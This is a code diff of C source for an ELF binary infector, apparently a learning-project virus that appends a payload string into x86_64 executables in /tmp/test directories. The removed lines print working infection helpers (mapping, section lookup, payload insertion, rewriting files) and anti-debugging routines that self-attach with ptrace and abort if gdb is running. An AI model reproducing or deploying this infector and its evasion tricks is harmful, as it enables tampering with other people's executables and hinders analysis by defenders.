@@ -30,88 +30,6 @@ static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
     }
 }
 
-static int  mapFile(const char *dirname, const char *filename, struct bfile *file) {
-  int         fd;
-  char        *tmp;
-  struct stat stats;
-
-  if ((tmp = malloc(strlen(dirname) + strlen(filename) + 2)) == NULL)
-    return (-1);
-  strcpy(tmp, dirname);
-  strcat(tmp, "/");
-  strcat(tmp, filename);
-  if ((fd = open(tmp, O_RDWR)) == -1) {
-    free(tmp);
-    return (-1);
-  }
-  free(tmp);
-  if (fstat(fd, &stats) == -1) {
-    close(fd);
-    return (-1);
-  }
-  file->size = stats.st_size;
-  if ((file->header = mmap(NULL, file->size + strlen(payload) + 1, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED) {
-    close(fd);
-    return (-1);
-  }
-  close(fd);
-  return (0);
-}
-
-static int  isCompatible(unsigned char e_ident[EI_NIDENT], Elf64_Half e_machine) {
-  return (e_ident[EI_MAG0] == ELFMAG0 &&
-          e_ident[EI_MAG1] == ELFMAG1 &&
-          e_ident[EI_MAG2] == ELFMAG2 &&
-          e_ident[EI_MAG3] == ELFMAG3 &&
-          e_machine == EM_X86_64);
-}
-
-static Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header) {
-  Elf64_Shdr  *pointer;
-  Elf64_Shdr  *shstrHeader;
-
-  pointer = ((void *)header) + header->e_shoff;
-  shstrHeader = ((void *)header) + header->e_shoff + sizeof(Elf64_Shdr) * header->e_shstrndx;
-  while (strcmp(((void *)header) + shstrHeader->sh_offset + pointer->sh_name, ".data") != 0)
-    pointer += 1;
-  return (pointer);
-}
-
-static int  writeToFile(const char *dirname, const char *filename, struct bfile header) {
-  int   fd;
-  char  *tmp;
-
-  if ((tmp = malloc(strlen(dirname) + strlen(filename) + 2)) == NULL)
-    return (-1);
-  strcpy(tmp, dirname);
-  strcat(tmp, "/");
-  strcat(tmp, filename);
-  if ((fd = open(tmp, O_WRONLY)) == -1) {
-    free(tmp);
-    return (-1);
-  }
-  free(tmp);
-  write(fd, header.header, header.size);
-  close(fd);
-  return (0);
-}
-
-static int  appendSignature(struct bfile file, size_t offset) {
-  size_t  i;
-  void    *tmp;
-  size_t  toAdd;
-  size_t  total;
-
-  i = file.size - 1;
-  tmp = file.header;
-  toAdd = strlen(payload) + 1;
-  total = file.size - offset;
-  memmove(tmp + i + toAdd - total, tmp + i - total, total);
-  i -= total - 1;
-  memcpy(tmp + i, payload, toAdd);
-  return (0);
-}
-
 static int  infectFile(const char *dirname, struct dirent *file) {
   Elf64_Shdr    *data;
   struct bfile  header;
@@ -147,49 +65,12 @@ static int  infectBins(const char *dirname) {
   return (0);
 }
 
-static int  preventDebug(void) {
-  pid_t pid;
-
-  if ((pid = fork()) == -1)
-    return (-1);
-  if (pid != 0) {
-    if (ptrace(PTRACE_ATTACH, pid, 0, 0) == -1 ||
-        waitpid(pid, 0, 0) == -1) {
-      kill(pid, SIGTERM);
-      return (-1);
-    }
-    exit(0);
-  } else {
-    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
-      exit(1);
-  }
-  return (0);
-}
-
-static int checkProcess(void) {
-  PROCTAB *pt;
-  proc_t  *proc;
-
-  if ((pt = openproc(PROC_FILLCOM)) == NULL)
-    return (-1);
-  proc = NULL;
-  while ((proc = readproc(pt, proc)) != NULL) {
-    if (proc->cmdline != NULL)
-      if (strstr(proc->cmdline[0], "gdb") != NULL)
-        return (1);
-  }
-  free(proc);
-  closeproc(pt);
-  return (0);
-}
-
 int   main(void) {
   size_t  i;
   char    *infectDir[3] = {"/tmp/test", "/tmp/test2", NULL};
 
   if (checkProcess() != 0)
     return (1);
-  dprintf(1, "Checked process\n");
   if (preventDebug() == -1)
     return (1);
   i = 0;
